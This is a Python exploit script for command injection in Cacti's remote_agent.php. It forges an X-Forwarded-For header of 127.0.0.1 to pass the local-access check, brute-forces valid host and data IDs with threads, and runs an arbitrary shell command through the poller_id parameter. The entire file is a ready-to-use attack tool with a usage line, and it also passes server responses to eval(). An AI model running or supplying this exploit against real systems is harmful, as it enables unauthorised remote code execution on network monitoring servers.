#!/usr/bin/env python3


import requests
import sys
import threading
from urllib.parse import urlparse
from urllib.parse import quote


HOST_ID       = 1  # modify this if you already have HOST_ID and mark brute_ids function call
LOCAL_DATA_ID = 6  # modify this if you already have LOCAL_DATA_ID and mark brute_ids function call
THREAD_LOCK   = threading.Lock()
THREAD_STATUS = False


def brute_ids(url):
    """
    brute_ids
    this function tries to brute host_id and local_data_id using threading for Cacti.
    When a host_id and local_data_id is found, they are stored in global variables
        - LOCAL_DATA_ID
        - HOST_ID
    """
    global HOST_ID, LOCAL_DATA_ID

    if HOST_ID != 0 or LOCAL_DATA_ID != 0:
        return
    
    cacti_addr = urlparse(url).netloc

    # tell Cacti that the request is forwarded for his own localhost
    headers = {
        "X-Forwarded-For" : '127.0.0.1' #f'{cacti_addr}'
    }

    # trying connection
    try:
        requests.get(url)
    except:
        print(f"[X] Error trying to connect to {url}")
        exit(0)

    URLs = []
    host_id_max       = 100
    local_data_id_max = 100
    for host_id in range(host_id_max):
        for local_data_id in range(local_data_id_max):
            URLs.append(f"{url}/remote_agent.php?action=polldata&local_data_ids[]={local_data_id}&host_id={host_id}&poller_id=669")

    thread_list  = []
    thread_count = 10
    for i in range(thread_count):
        thread_list.append(threading.Thread(target=requester, args=[URLs, headers]))
        thread_list[i].start()

    for i in range(thread_count):
        thread_list[i].join()
    

def requester(url_list, headers={}):
    """
    requester is the function used in every thread.
    every thead makes request to cacti server until some valid local_data_id and host_id are found
    """
    global HOST_ID, LOCAL_DATA_ID, THREAD_LOCK, THREAD_STATUS
    
    while len(url_list) > 0 and THREAD_STATUS == False: 
        url   = ""
        query = ""
        with THREAD_LOCK:
            url = url_list.pop(0)
            query = urlparse(url).query
            
        
        
        response = requests.get(url, headers=headers)

        with THREAD_LOCK:
            print(f"[!] Trying: {query} --> {response.content.decode()}")

        if len(response.content) != 2:
            content = eval(response.content.decode())
            if content[0]["rrd_name"] == "uptime":
                THREAD_STATUS = True
                values = []
                for param in query.split("&")[1:3]:
                    values.append(param.split("=")[1])

                LOCAL_DATA_ID, HOST_ID = values[0], values[1]


def exploit(url, cmd):
    global HOST_ID, LOCAL_DATA_ID
    print(HOST_ID, LOCAL_DATA_ID)
    payload = quote(f"669;{cmd}")
    
    print(f"[!] Sending payload: {payload} ")
    
    # tell Cacti that the request is forwarded for his own localhost
    headers = {
        "X-Forwarded-For" : '127.0.0.1' #f'{cacti_addr}'
    }

    response = requests.get(
        f"{url}/remote_agent.php?action=polldata&local_data_ids[]={LOCAL_DATA_ID}&host_id={HOST_ID}&poller_id={payload}",
        headers=headers
    )

    print(response.content)
            

def main():
    sys.argv.pop(0)
    if len(sys.argv) < 2:
        print("usage: ./script.py http://cacti_address:cacti_port/ whoami")
        exit(0)
    
    url = sys.argv[0]
    cmd = " ".join(sys.argv[1:])

    # if you already have HOST_ID and LOCAL_DATA_ID then mark the next instruction
    brute_ids(url)

    exploit(url, cmd)

if __name__ == "__main__":
    main()